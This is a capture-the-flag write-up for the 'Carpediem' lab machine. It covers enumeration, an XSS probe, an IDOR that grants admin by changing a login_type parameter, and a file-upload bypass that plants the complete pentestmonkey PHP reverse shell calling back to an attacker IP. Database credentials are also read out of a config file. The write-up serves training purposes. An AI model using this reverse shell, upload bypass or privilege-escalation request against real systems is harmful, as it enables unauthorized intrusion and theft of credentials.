# Carpediem

## User Flag

### Enumeration

As always, we'll tie our our ip to our vhost in /etc/hosts/.

After an initiall nmap scan we got the following results:

```
nmap -sV -A 10.10.11.167 
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-13 14:22 MDT
Nmap scan report for carpediem.htb (10.10.11.167)
Host is up (0.074s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Comming Soon
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.34 seconds
```

After visiting the site, we're greeted with a coming soon page that has a countdown. This reminds me of trick in a way.

Next, I was going to look for any vhosts that I could find:

```
ffuf -H "Host: FUZZ.carpediem.htb" -H "User-Agent: YourMom" -c -w "SecLists/Discovery/DNS/subdomains-top1million-110000.txt" -u "http://carpediem.htb/" -fs 31090

portal                  [Status: 200, Size: 31090, Words: 7687, Lines: 463]
```

portal.carpediem.htb takes us to a motorcycle store page that clearly has a much larger attack surface.

After putting some sample data into the search bar, I started trying some XSS vulnerabilities.

I loaded up Burp Suite, intercepted an XSS request, and got a pretty simple XSS vulnerability to fire.

```
"><script>alert(1);</script>
```

Next, I registered as a user. There is a parameter at the top: *http://portal.carpediem.htb/?p=my_account*

After going down a few XSS and LFI rabbit holes, I found and abused an IDOR vulnerability that is the ie login management system that I intercepted when I performed a password reset request.

```
POST /classes/Master.php?f=update_account HTTP/1.1
Host: portal.carpediem.htb
Content-Length: 114
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://portal.carpediem.htb
Referer: http://portal.carpediem.htb/?p=edit_account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=c303a9678970c048cb546415268e139b
Connection: close

id=26&login_type=2&firstname=test&lastname=test&contact=test&gender=Male&address=test&username=test&password=test2
```

There is that login_type parameter. What if we change that to 1 instead??

Upon changing the login_type to 1, which is the admin (we know this as we were the first one to create an account, which set our login_type to 2, so this allowed us to elevate our privilages).

Now we can successful authenticate to the *portal.carpediem.htb/admin/* page!

### Planting a Shell

I noticed on the admin page is a place to upload thumbnails of your bikes. So I'm going to attempt to plant a php shell there.

So after trying there a bit, I poked around some more and found a quarterly sale report page that claimed it was "under development".

I also found a potential file upload vulnerability in the avatar upload on the admin user's settings.

I dug up a php reverse shell from here and pasted it in after changing the ip address values: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Then I ran a netcat listener and waited...

The request:

```
POST /classes/Users.php?f=upload HTTP/1.1
Host: portal.carpediem.htb
Content-Length: 5873
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuvzYJhBo2FEjbqaP
Origin: http://portal.carpediem.htb
Referer: http://portal.carpediem.htb/admin/?page=user
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=c303a9678970c048cb546415268e139b
Connection: close

------WebKitFormBoundaryuvzYJhBo2FEjbqaP
Content-Disposition: form-data; name="file_upload"; filename="shell.php"
Content-Type: image/jpeg

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.44';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 



------WebKitFormBoundaryuvzYJhBo2FEjbqaP--
```

The response:

```
nc -lvp 1234
Listening on 0.0.0.0 1234
Connection received on carpediem.htb 44236
Linux 3c371615b7aa 5.4.0-97-generic #110-Ubuntu SMP Thu Jan 13 18:22:13 UTC 2022 x86_64 GNU/Linux
 22:13:03 up 1 day, 17:22,  0 users,  load average: 0.07, 0.06, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

I was in!

### Securing the foothold

At the /var/www/html/portal directory I found an interesting file called initialize.php.

```
$ cat /var/www/html/portal/initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','http://portal.carpediem.htb/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"mysql");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"portaldb");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"J5tnqsXpyzkK4XNt");
if(!defined('DB_NAME')) define('DB_NAME',"portal");
?>
$ 
```

This is interesting. We have a DB Username and a DB Password as *portaldb:J5tnqsXpyzkK4XNt*.

One other thing that is really interesting is the result of catting /etc/hosts:

```
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      mysql a5004fe641ca
172.17.0.6      3c371615b7aa
```

Perhaps the credentials we just stole (they didn't work in ssh) might work here? If we can figure out how to pivot access of course.
